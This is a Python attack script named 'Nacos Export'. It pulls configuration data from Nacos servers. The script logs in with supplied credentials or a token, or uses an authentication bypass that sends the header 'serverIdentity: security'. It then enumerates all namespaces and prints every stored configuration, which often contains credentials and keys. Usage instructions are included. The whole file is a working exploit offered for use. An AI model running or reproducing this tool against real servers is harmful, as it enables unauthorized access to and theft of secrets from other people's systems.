import requests
import sys


proxy = {
    # "http": "127.0.0.1:8080"
}

def get_auth_token(target: str, username: str, password: str) -> str:
    token = ""
    path = "/v1/auth/users/login"
    url = target + path
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
    }
    data = {
        'username': username,
        'password': password,
    }
    try:
        resp = requests.post(url, headers=headers, data=data, proxies=proxy)
        resp_dict = resp.json()
        token = resp_dict.get("accessToken")
    except Exception:
        pass
    
    
    return token

def get_auth_token_no_users(target: str, username: str, password: str) -> str:
    token = ""
    path = "/v1/auth/login"
    url = target + path
    headers = {
        'Accept': 'application/json',
        # X-Requested-With: XMLHttpRequest
        # Authorization: null
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.95 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    data = {
        'username': username,
        'password': password,
        'namespaceId': ''
    }
    try:
        resp = requests.post(url, headers=headers, data=data, proxies=proxy)
        token = resp.headers.get("Authorization")
    except Exception:
        pass
    return token


def get_namespaces(target: str, token: str, bypass: bool) -> list:
    namespace_id = []
    path = "/v1/console/namespaces"
    url = target + path
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
    }
    if bypass:
        headers['serverIdentity'] = "security"
    params = {
        'namespaceId': '',
    }
    resp = requests.get(url, headers=headers, params=params, proxies=proxy)
    resp_dict = resp.json()
    namespace_id = [item['namespace'] for item in resp_dict['data']]
    return namespace_id


def dump_config_content(target: str, namespaces: list, token: str, bypass: bool, count: int = 100):
    content_list = list()
    path = '/v1/cs/configs'
    url = target + path
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accesstoken': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.91 Safari/537.36',
    }
    if bypass:
        headers['serverIdentity'] = "security"
    for namespace in namespaces:
        params = {
            'dataId': '',
            'group': '',
            'appName': '',
            'config_tags': '',
            'pageNo': 1,
            'pageSize': count,
            'tenant': namespace,
            'search': 'accurate',
            'accessToken': token,
        }
        resp = requests.get(url, headers=headers, params=params, proxies=proxy)
        resp_dict = resp.json()
        for item in resp_dict['pageItems']:
            print("[+] NAMESPACE: {namespace}\n[+] CONFIG: {dataid}".format(dataid=item["dataId"], namespace=item["group"]))
            print(item['content'])
            content_list.append(item['content'])
    return content_list

# def parser_config(content):
    # # TODO
    # for c in content:
    #     pass

def usage(name: str):
    print("""
 ______________
< Nacos Export >         @Author: Arm!tage
 --------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |         
                ||     ||

Usage:
    python3 {script} <URL> <USERNAME> <PASSWORD>
    python3 {script} <URL> <TOKEN>
    python3 {script} <URL> nacos-auth-bypass

Example:
    python3 {script} http://localhost:8848/nacos nacos nacos
    python3 {script} http://localhost:8848/nacos 2XnOEwXXXXXXXXXXXXXXXXtboYW
    """.format(script=name))


if __name__ == '__main__':
    if len(sys.argv) < 3:
        usage(sys.argv[0])
        exit()

    target = sys.argv[1].rstrip('/')
    print("[+] Target: ", target)
    token = ""
    bypass = False
    if len(sys.argv) == 4:
        print("[+] Username: ", sys.argv[2])
        print("[+] Password: ", sys.argv[3])
        print("\n")
        token = get_auth_token(target, sys.argv[2], sys.argv[3])
        if token == None:
            token = get_auth_token_no_users(target, sys.argv[2], sys.argv[3])
    if len(sys.argv) == 3:
        if sys.argv[2] != "nacos-auth-bypass":
            print("[+] Token: ", sys.argv[2])
            print("\n")
            token = sys.argv[2]
        else:
            # header = { "serverIdentity": "security"}
            print("[+] Bypass")
            print("\n")
            bypass = True



    namespaces = get_namespaces(target, token, bypass)
    dump_config_content(target, namespaces, token, bypass)
    # parser_config(dump_config_content(target, namespaces, token, bypass))